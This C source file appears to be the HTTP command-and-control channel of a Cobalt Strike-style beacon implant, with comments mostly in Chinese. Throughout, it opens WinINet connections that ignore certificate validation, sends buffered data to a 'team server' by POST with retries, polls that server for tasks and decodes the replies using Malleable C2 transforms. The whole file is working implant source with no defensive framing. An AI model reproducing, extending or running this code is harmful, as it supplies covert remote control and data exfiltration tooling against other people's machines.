#include "channel.h"
#include <string.h>
#include <windows.h>
#include <wininet.h>
#include "tokens.h"
#include "profile.h"
#include "beacon.h"
#include "track_memory.h"


#define PROXYB_MANUAL 0
#define PROXYB_DIRECT 1
#define PROXYB_PRECONFIG 2
#define PROXYB_MANUAL_CREDS 4

#define HTTP_FLAGS  INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_UI | INTERNET_FLAG_KEEP_CONNECTION
#define HTTPS_FLAGS HTTP_FLAGS | INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID

#pragma comment( lib, "wininet" )
#pragma comment( lib, "ws2_32" )

extern sessdata bigsession;

static HINTERNET session_h = NULL;
static HINTERNET connect_h = NULL;

static char * http_post_buffer = NULL;
int http_post_len    = 0;

/* 我们的HTTP标志 */
static DWORD httpflags;
static DWORD_PTR dummyContext; /* 一个虚拟上下文对象 */

#define MAX_HTTP_POST (1024 * 1024 * 2)

void http_init(char * host, int port, char * ua) {
	unsigned long timeout = 240000;

	token_guard_start();

	/* 设置HTTP标志 */
	httpflags = IS_HTTPS ? HTTPS_FLAGS : HTTP_FLAGS;
	if (setting_short(SETTING_HTTP_NO_COOKIES) == 1)
		httpflags |= INTERNET_FLAG_NO_COOKIES;

	/* 创建会话，但要考虑用户指定的代理配置 */
	switch (setting_short(SETTING_PROXY_BEHAVIOR)) {
		case PROXYB_PRECONFIG:
			session_h = InternetOpenA(ua, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
			break;
		case PROXYB_DIRECT:
			session_h = InternetOpenA(ua, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
			break;
		case PROXYB_MANUAL:
		case PROXYB_MANUAL_CREDS:
			session_h = InternetOpenA(ua, INTERNET_OPEN_TYPE_PROXY, setting_ptr(SETTING_PROXY_CONFIG), NULL, 0);
			break;
		default:
			break;
	}

	/* 4 minute timeout... this is fair I think; unless you're hacking someone on dialup. Then you're in trouble :P~
       I set timeouts b/c WinINet limits max outgoing connections to a server. It will deliberately block a request
	   until the total (perceived) connections drops below the max. Sometimes, WinINet holds on to a connection that
	   no longer exists. This sucks */
	InternetSetOption(session_h, INTERNET_OPTION_SEND_TIMEOUT, (void *)&timeout, sizeof(unsigned long));
	InternetSetOption(session_h, INTERNET_OPTION_RECEIVE_TIMEOUT, (void *)&timeout, sizeof(unsigned long));

	connect_h = InternetConnectA(session_h, host, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, dummyContext);

	/* 如果我们有凭据，立即将它们分配给这个连接 */
	if (setting_short(SETTING_PROXY_BEHAVIOR) == PROXYB_MANUAL_CREDS) {
		InternetSetOption(connect_h, INTERNET_OPTION_PROXY_USERNAME, setting_ptr(SETTING_PROXY_USER), setting_len(SETTING_PROXY_USER));
		InternetSetOption(connect_h, INTERNET_OPTION_PROXY_PASSWORD, setting_ptr(SETTING_PROXY_PASSWORD), setting_len(SETTING_PROXY_PASSWORD));
	}

	token_guard_stop();
}

void http_close() {
	token_guard_start();
	InternetCloseHandle(connect_h);	
	InternetCloseHandle(session_h);
	token_guard_stop();
}

void sanityCheck(char * buffer, int len) {
	unsigned int size;
	int pos = 0;
	while (pos < len) {
		memcpy((void *)&size, buffer + pos, 4);
		size = ntohl(size);
		if (pos + size > len) {
			//dlog("Corrupt size: pos:%d size:%d len:%d\n", pos, size, len);
		}
		pos += size + 4;
	}
}

/*
 * 移除和调整某些头部需要在连接过程的最后阶段进行。
 * 参见：https://stackoverflow.com/a/19418895
 */
void CALLBACK fixRequestLate(HINTERNET hInternet, DWORD_PTR dwContext, DWORD dwInternetStatus, LPVOID lpvStatusInformation, DWORD dwStatusInformationLength) {
	if (dwInternetStatus == INTERNET_STATUS_CONNECTED_TO_SERVER) {
		HttpAddRequestHeadersA(hInternet, setting_ptr(SETTING_HEADERS_REMOVE), -1, HTTP_ADDREQ_FLAG_REPLACE);
	}
}

void fixRequest(HINTERNET request) {
	DWORD  flags;
	DWORD  flen;

	/* 如果我们是SSL信标，设置这些选项 */
	if (IS_HTTPS) {
		flen = sizeof(flags);
		InternetQueryOption (request, INTERNET_OPTION_SECURITY_FLAGS, (LPVOID)&flags, &flen);
		flags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA;
		flags |= SECURITY_FLAG_IGNORE_WRONG_USAGE;
		flags |= SECURITY_FLAG_IGNORE_REVOCATION;
		flags |= SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
		flags |= SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
		InternetSetOption (request, INTERNET_OPTION_SECURITY_FLAGS, &flags, sizeof (flags) );
	}

	/* 注册回调以在稍后修复请求 */
			/* 注意：由于控制流保护（CFG），此功能与模块stomping不兼容。回调会
				触发CFG检查并导致进程崩溃 */
	if (setting_ptr(SETTING_HEADERS_REMOVE) != NULL)
		InternetSetStatusCallback(request, fixRequestLate);
}

BOOL http_request_isOK(HINTERNET request) {
	DWORD statusCode;
	char responseText[256]; // change to wchar_t for unicode
	DWORD responseTextSize = 256;

	if (!HttpQueryInfoA(request, HTTP_QUERY_STATUS_CODE, &responseText, &responseTextSize, NULL)) {
		// dlog("channel.http_request_isOK - HttpQueryInfoA failed \n");
		return FALSE;
	}

	/* 检查实际的HTTP返回码 */
	statusCode = atoi(responseText);
	// dlog("channel.http_request_isOK - statusCode : %d \n", statusCode);
	if (statusCode != 200) {
		return FALSE;
	}

	return TRUE;
}

/* 如果有数据要发送则发送数据 */
void http_post_maybe(char * hook) {
	LPCSTR accept[2] = { "*/*", NULL };
	char myuri[1024]  = {0};
	char myid[128]   = {0};
	HINTERNET request;
	profile   myprofile = {0};
	DWORD     retry;

	if (http_post_len == 0)
		return;

	/* 设置配置文件 */
	profile_setup(&myprofile, http_post_len);

	/* 将hook分配给URI */
	_snprintf(myprofile.uri, 1024, "%s", hook);

	/* 将ID转换为字符串，因为它是POST请求的参数 */
	_snprintf(myid, 128, "%d", bigsession.myid);

	/* 应用POST请求转换 */
	apply(setting_ptr(SETTING_C2_POSTREQ), &myprofile, myid, strlen(myid), http_post_buffer, http_post_len);

	if (strlen(myprofile.parameters) == 0) {
		_snprintf(myuri, 1024, "%s", myprofile.uri);
	}
	else {
		_snprintf(myuri, 1024, "%s%s", myprofile.uri, myprofile.parameters);
	}

	token_guard_start();

	/* 尝试请求，最多5次 */
	for (retry = 0; retry < 4; retry++) {
		request = HttpOpenRequestA(connect_h, setting_ptr(SETTING_C2_VERB_POST), myuri, NULL, NULL, accept, httpflags, dummyContext);
		fixRequest(request);

		HttpSendRequestA(request, myprofile.headers, strlen(myprofile.headers), myprofile.buffer, myprofile.blen);

		/* 工作正常！太好了！ */
		if (http_request_isOK(request)) {
			InternetCloseHandle(request);
			break;
		}
		/* 关闭请求，但再试一次 */ 
		else {
			InternetCloseHandle(request);
		}

		Sleep(500);
	}

	profile_free(&myprofile, http_post_len);

	http_post_len = 0;

	token_guard_stop();
}

/* 发送我们的数据 */
void http_put(char * hook, void * buffer, int len, BOOL postNow) {
	unsigned int flen = 0;

	/* 如果需要则分配数据 */
	if (http_post_buffer == NULL) {
		http_post_buffer = (char *)malloc(sizeof(char) * MAX_HTTP_POST);
		track_memory_add(http_post_buffer, sizeof(char) * MAX_HTTP_POST, TRACK_MEMORY_MALLOC, TRUE, NULL);
	}

	/* 进行健全性检查，确保我们不会发送过大的文件 */
	if ((len + sizeof(unsigned int)) > MAX_HTTP_POST) {
		/* 单个POST太大，我们将忽略它 */
		return;
	}
	/* 如果太大，现在就发送 */
	else if ((http_post_len + len + sizeof(unsigned int)) > MAX_HTTP_POST) {
		http_post_maybe(hook);
	}

	/* 如果不是太大，让我们添加长度和数据 */
	flen = htonl(len);
	memcpy((void *)(http_post_buffer + http_post_len), (void *)&flen, sizeof(unsigned int));
	http_post_len += sizeof(unsigned int);

	/* 现在，让我们添加要发送的数据 */
	memcpy((void *)(http_post_buffer + http_post_len), buffer, len);
	http_post_len += len;

	/* 执行！ */
	if (postNow) {
		http_post_maybe(hook);
	}
}

/* 获取我们要处理的数据包 */
int _http_get(char * hook, sessdata * meta, char * buffer, int max) {
	LPCSTR accept[2] = { "*/*", NULL };
	HINTERNET request;
	int statusCode;
	unsigned int   status = 0;
	DWORD avail  = 0;
	DWORD downloaded = 0;
	unsigned int read = 0;
	profile myprofile   = {0};
	char    myuri[1024] = {0};

	/* 设置配置文件 */
	profile_setup(&myprofile, meta->length);

	/* 将hook分配给URI */
	_snprintf(myprofile.uri, 1024, "%s", hook);

	/* 应用到配置文件 */
	apply(setting_ptr(SETTING_C2_REQUEST), &myprofile, meta->data, meta->length, NULL, 0);

	/* 请设置myuri */
	if (strlen(myprofile.parameters) == 0) {
		_snprintf(myuri, 1024, "%s", myprofile.uri);
	}
	else {
		_snprintf(myuri, 1024, "%s%s", myprofile.uri, myprofile.parameters);
	}

	/* 打开请求 */
	// dlog("channel._http_get - Opening and sending request for uri: %s \n", myuri);
	request = HttpOpenRequestA(connect_h, setting_ptr(SETTING_C2_VERB_GET), myuri, NULL, NULL, accept, httpflags, dummyContext);
	fixRequest(request);
	HttpSendRequestA(request, myprofile.headers, strlen(myprofile.headers), myprofile.buffer, myprofile.blen);

	/* 配置文件使用完毕，释放它 */
	profile_free(&myprofile, meta->length);

	/* 如果没有收到200 OK的HTTP状态响应则失败 */
	if (!http_request_isOK(request)) {
		// dlog("channel._http_get - Request is not OK \n");
		InternetCloseHandle(request);
		return -1;
	}

	/* 下一个技巧..检查我们得到了什么返回 */
	status = InternetQueryDataAvailable(request, &avail, 0, 0);
	// dlog("channel._http_get - InternetQueryDataAvailable status: %d avail: %d \n", status, avail);

	/* 注意：'avail'只是目前已写入的内容...另一端可能仍在写入响应... */
	if (!status || avail < 0 || avail >= max) {
		// CS-327: if data exceeds max, it is probably not our team server...
		// dlog("channel._http_get - Bad InternetQueryDataAvailable status or invalid avail: %d \n", avail);
		InternetCloseHandle(request);
		return -1;
	}
	if (avail == 0) {
		/* CS-327: Empty response data may or may not be our team server, we will assume it is though... */
		/*         Assumption: Normal idle response? */
		// dlog("channel._http_get - zero avail : %d \n", avail);
		InternetCloseHandle(request);
		return 0;
	}

	/* 现在...下载内容 */
	while (read < max) {
		if (!InternetReadFile(request, buffer + read, 4096, &downloaded))
			break;

		if (downloaded == 0)
			break;

		read += downloaded;
	}

	/* if read == max, then it's possible we only got part of the payload... so punt */
	if (read >= max) {
		InternetCloseHandle(request);
		// CS-327: if data exceeds max, it is probably not our team server...
		// dlog("channel._http_get - Read too much: %d max: %d \n", read, max);
		return -1;
	}

	InternetCloseHandle(request);

	/*
 * 使用Malleable C2程序处理我们读取的数据
 */
	// dlog("channel._http_get - Recovering data with Malleable C2 processing \n");
	read = recover(setting_ptr(SETTING_C2_RECOVER), buffer, read, max);

	return read;
}

int http_get(char * hook, void * cookie, char * buffer, int max) {
	int rv;
	token_guard_start();
	rv = _http_get(hook, (sessdata *)cookie, buffer, max);
	token_guard_stop();
	return rv;
}

/* 日志记录 */
/*
void dlog(char * fmt, ...) {
	char buff[2048];
	va_list va;

	memset(buff, 0, 2048);

	va_start(va, fmt);
	vsprintf_s(buff, 2048, fmt, va);
	va_end(va);

	OutputDebugStringA(buff);
}
*/
